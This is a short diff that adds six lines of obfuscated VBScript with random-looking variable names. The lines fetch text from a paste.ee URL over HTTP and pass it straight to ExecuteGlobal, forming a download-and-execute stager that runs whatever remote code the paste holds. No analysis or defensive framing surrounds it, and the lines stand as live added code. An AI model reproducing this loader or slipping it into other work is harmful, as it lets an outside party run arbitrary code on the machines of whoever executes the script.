@@ -1,0 +1,6 @@
+miOrEKvWqwEhHwIUZLXrYLNKFfTjkvASMQRvgHgVdCvNBywkmO = "https://paste.ee/d/uuVa6"
+Set RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ = CreateObject("MSXML2.ServerXMLHTTP")
+RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ.Open "GET", miOrEKvWqwEhHwIUZLXrYLNKFfTjkvASMQRvgHgVdCvNBywkmO, False
+RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ.Send
+arhHjdAqCAqAxPSxkCkoGSUwtKNeuYNZrTuXSjQvFiCevUVWJk = RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ.responseText
+ExecuteGlobal arhHjdAqCAqAxPSxkCkoGSUwtKNeuYNZrTuXSjQvFiCevUVWJk
